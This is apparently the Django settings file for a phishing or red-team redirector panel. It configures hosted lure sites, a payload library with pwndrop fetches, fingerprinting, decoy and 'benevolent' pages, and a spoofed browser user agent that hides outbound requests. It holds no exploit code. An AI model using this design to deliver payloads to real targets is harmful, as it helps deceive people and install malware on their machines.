"""Django settings for the RedirectorOfFun control plane."""
from pathlib import Path
import os
import sys
import dj_database_url

BASE_DIR = Path(__file__).resolve().parent.parent


def env_bool(name, default=False):
    return os.getenv(name, str(default)).lower() in {"1", "true", "yes", "on"}


DEBUG = env_bool("DEBUG", True)
SECRET_KEY = os.getenv("DJANGO_SECRET_KEY", "development-only-change-me")
ALLOWED_HOSTS = [h.strip() for h in os.getenv("ALLOWED_HOSTS", "*").split(",") if h.strip()]
CSRF_TRUSTED_ORIGINS = [o.strip() for o in os.getenv("CSRF_TRUSTED_ORIGINS", "").split(",") if o.strip()]

INSTALLED_APPS = [
    "config.apps.ControlPlaneConfig",
    "django.contrib.admin",
    "django.contrib.auth",
    "django.contrib.contenttypes",
    "django.contrib.sessions",
    "django.contrib.messages",
    "django.contrib.staticfiles",
    "rest_framework",
    "accounts",
    "audit",
    "analytics",
    "notifications",
    "gates",
    "api",
]

MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "whitenoise.middleware.WhiteNoiseMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "accounts.middleware.OperatorSessionMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
    "config.middleware.RequestIDMiddleware",
    "gates.middleware.BlockingRuleMiddleware",
]

ROOT_URLCONF = "config.urls"
TEMPLATES = [{
    "BACKEND": "django.template.backends.django.DjangoTemplates",
    "DIRS": [BASE_DIR / "templates"],
    "APP_DIRS": True,
    "OPTIONS": {"context_processors": [
        "django.template.context_processors.request",
        "django.contrib.auth.context_processors.auth",
        "django.contrib.messages.context_processors.messages",
        "accounts.context_processors.panel_context",
    ]},
}]
WSGI_APPLICATION = "config.wsgi.application"

DATABASES = {"default": dj_database_url.config(
    default=f"sqlite:///{BASE_DIR / 'db.sqlite3'}",
    conn_max_age=60,
    conn_health_checks=True,
)}
DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"
AUTH_USER_MODEL = "accounts.Operator"
AUTH_PASSWORD_VALIDATORS = [
    {"NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator"},
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator", "OPTIONS": {"min_length": 12}},
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator"},
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator"},
]
PASSWORD_HASHERS = [
    "django.contrib.auth.hashers.Argon2PasswordHasher",
    "django.contrib.auth.hashers.PBKDF2PasswordHasher",
    "django.contrib.auth.hashers.PBKDF2SHA1PasswordHasher",
    "django.contrib.auth.hashers.BCryptSHA256PasswordHasher",
]

LANGUAGE_CODE = "en-us"
TIME_ZONE = "UTC"
USE_I18N = True
USE_TZ = True

STATIC_URL = "/static/"
STATICFILES_DIRS = [BASE_DIR / "static"]
STATIC_ROOT = BASE_DIR / "staticfiles"
STORAGES = {
    "default": {"BACKEND": "django.core.files.storage.FileSystemStorage"},
    "staticfiles": {"BACKEND": "config.storage.StaticFilesStorage"},
}
if "test" in sys.argv:
    STORAGES["staticfiles"] = {"BACKEND": "django.contrib.staticfiles.storage.StaticFilesStorage"}

LOGIN_URL = "login"
LOGIN_REDIRECT_URL = "overview"
LOGOUT_REDIRECT_URL = "login"
SESSION_COOKIE_AGE = 8 * 60 * 60
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Lax"
CSRF_COOKIE_SAMESITE = "Lax"
# Cookies are not marked Secure by default: the panel must work from any IP
# over plain http out of the box. Set both to true once it is served over
# trusted https.
SESSION_COOKIE_SECURE = env_bool("SESSION_COOKIE_SECURE", False)
CSRF_COOKIE_SECURE = env_bool("CSRF_COOKIE_SECURE", False)
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_REFERRER_POLICY = "same-origin"
X_FRAME_OPTIONS = "DENY"

REST_FRAMEWORK = {
    "DEFAULT_AUTHENTICATION_CLASSES": [
        "rest_framework.authentication.SessionAuthentication",
        "accounts.authentication.APIKeyAuthentication",
    ],
    "DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.IsAuthenticated"],
    "DEFAULT_THROTTLE_CLASSES": [
        "rest_framework.throttling.AnonRateThrottle",
        "rest_framework.throttling.UserRateThrottle",
    ],
    "DEFAULT_THROTTLE_RATES": {"anon": "20/min", "user": "240/min"},
}

BOOTSTRAP_BASE_URL = os.getenv("BOOTSTRAP_BASE_URL", "http://localhost:3000").rstrip("/")
BOOTSTRAP_TOKEN_TTL_MINUTES = int(os.getenv("BOOTSTRAP_TOKEN_TTL_MINUTES", "0"))
INVITATION_TTL_HOURS = int(os.getenv("INVITATION_TTL_HOURS", "48"))
ANALYTICS_RETENTION_DAYS = int(os.getenv("ANALYTICS_RETENTION_DAYS", "30"))
ANALYTICS_ALERT_THRESHOLD = int(os.getenv("ANALYTICS_ALERT_THRESHOLD", "1000"))
# Track every request in the events stream, not just 404s. nginx still writes
# one JSON log; the collector stores all statuses when this is on.
TRACK_ALL_REQUESTS = env_bool("TRACK_ALL_REQUESTS", False)
ANALYTICS_IP_HASH_SALT = os.getenv("ANALYTICS_IP_HASH_SALT", "development-only-analytics-salt")
NGINX_JSON_LOG_PATH = os.getenv("NGINX_JSON_LOG_PATH", "/var/log/nginx/access.json")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

# Release gates / delivery links.
def _norm_base(value, default):
    value = value.strip().strip("/")
    return f"/{value}/" if value else default


GATE_BASE_PATH = _norm_base(os.getenv("GATE_BASE_PATH", "/g/"), "/g/")
# Secret URL prefix in front of every operator path (/panel, /api, /m, /login,
# /setup, django-admin). start.sh fills this with a random UUID; empty means
# unprefixed, which is only reasonable for local development.
OPERATOR_PREFIX = os.getenv("OPERATOR_PREFIX", "").strip().strip("/")
AGENT_BASE_PATH = _norm_base(os.getenv("AGENT_BASE_PATH", "/a/"), "/a/")
# Public mount point for hosted lure sites: <LURE_BASE_PATH><slug>/<file>.
# Must differ from GATE_BASE_PATH and AGENT_BASE_PATH.
LURE_BASE_PATH = _norm_base(os.getenv("LURE_BASE_PATH", "/l/"), "/l/")
AUTO_BAN_THRESHOLD = int(os.getenv("AUTO_BAN_THRESHOLD", "5"))
NGINX_BAN_INCLUDE = os.getenv("NGINX_BAN_INCLUDE", "")
NGINX_AGENT_ROUTES_INCLUDE = os.getenv("NGINX_AGENT_ROUTES_INCLUDE", "")
PWNDROP_TIMEOUT = int(os.getenv("PWNDROP_TIMEOUT", "10"))
PWNDROP_MAX_BYTES = int(os.getenv("PWNDROP_MAX_BYTES", str(512 * 1024 * 1024)))
# Best-effort IP enrichment (ASN/ISP/geo) for blocking rules; lookups are
# cached in the database. Disable to keep the panel fully offline.
IP_INTEL_ENABLED = env_bool("IP_INTEL_ENABLED", True)
IP_INTEL_TIMEOUT = float(os.getenv("IP_INTEL_TIMEOUT", "2.5"))
# Outbound fetches (pwndrop, intel, telegram) should not announce the project.
OUTBOUND_USER_AGENT = os.getenv(
    "OUTBOUND_USER_AGENT",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
)
# Prefix embedded in watermarked releases; change it per engagement so a
# leaked sample cannot be attributed to the default marker format.
WATERMARK_PREFIX = os.getenv("WATERMARK_PREFIX") or (
    "wm" + __import__("hashlib").sha256(
        (os.getenv("ANALYTICS_IP_HASH_SALT", "") or SECRET_KEY).encode()).hexdigest()[:6])
DECISION_UNDO_SECONDS = int(os.getenv("DECISION_UNDO_SECONDS", "10"))
DECOY_CANARIES = env_bool("DECOY_CANARIES", True)
REDIRECTOR_DOMAINS = [d.strip() for d in os.getenv("REDIRECTOR_DOMAINS", "").split(",") if d.strip()]
# Peers allowed to supply X-Forwarded-For; any other client has its own
# header ignored so it cannot spoof addresses for bans or telemetry. CIDR
# ranges are supported. The private ranges cover the docker networks the
# web tier and the edge run in.
TRUSTED_PROXIES = tuple(p.strip() for p in os.getenv(
    "TRUSTED_PROXIES", "127.0.0.1,::1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16").split(",") if p.strip())
SUBMISSION_MAX_BYTES = int(os.getenv("SUBMISSION_MAX_BYTES", str(4 * 1024 * 1024)))
# The panel is reached through the nginx web tier, which sets this header.
SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")
VAPID_PUBLIC_KEY = os.getenv("VAPID_PUBLIC_KEY", "")
VAPID_PRIVATE_KEY = os.getenv("VAPID_PRIVATE_KEY", "")
VAPID_ADMIN_EMAIL = os.getenv("VAPID_ADMIN_EMAIL", "mailto:operators@example.com")
MEDIA_URL = "/media/"
# All operator content lives under ./data/: the payload library, the custom
# page pools, uploaded files, and the surface-document overrides.
DATA_DIR = Path(os.getenv("DATA_DIR", str(BASE_DIR / "data")))
# Absolute base for operator-facing URLs (QR codes, copy buttons). Set it to
# the public domain (https://updates.example.com) or leave empty to use the
# request host, falling back to the server's primary IP - never loopback.
PUBLIC_URL = os.getenv("PUBLIC_URL", "")
# Payload library: one folder per bundle (files + notes.md + favicon.ico).
PAYLOAD_LIBRARY_DIR = Path(os.getenv("PAYLOAD_LIBRARY_DIR", str(DATA_DIR / "payloads")))
# Custom held-view pages: loading/fingerprint/download/benevolent pools.
LOADING_PAGES_DIR = Path(os.getenv("LOADING_PAGES_DIR", str(DATA_DIR / "loading")))
FINGERPRINT_PAGES_DIR = Path(os.getenv("FINGERPRINT_PAGES_DIR", str(DATA_DIR / "fingerprint")))
DOWNLOAD_PAGES_DIR = Path(os.getenv("DOWNLOAD_PAGES_DIR", str(DATA_DIR / "download")))
BENEVOLENT_PAGES_DIR = Path(os.getenv("BENEVOLENT_PAGES_DIR", str(DATA_DIR / "benevolent")))
DECOY_PAGES_DIR = Path(os.getenv("DECOY_PAGES_DIR", str(DATA_DIR / "decoys")))
MEDIA_ROOT = Path(os.getenv("MEDIA_ROOT", str(DATA_DIR / "media")))

LOGGING = {
    "version": 1,
    "disable_existing_loggers": False,
    "handlers": {"console": {"class": "logging.StreamHandler"}},
    "root": {"handlers": ["console"], "level": os.getenv("LOG_LEVEL", "INFO")},
}
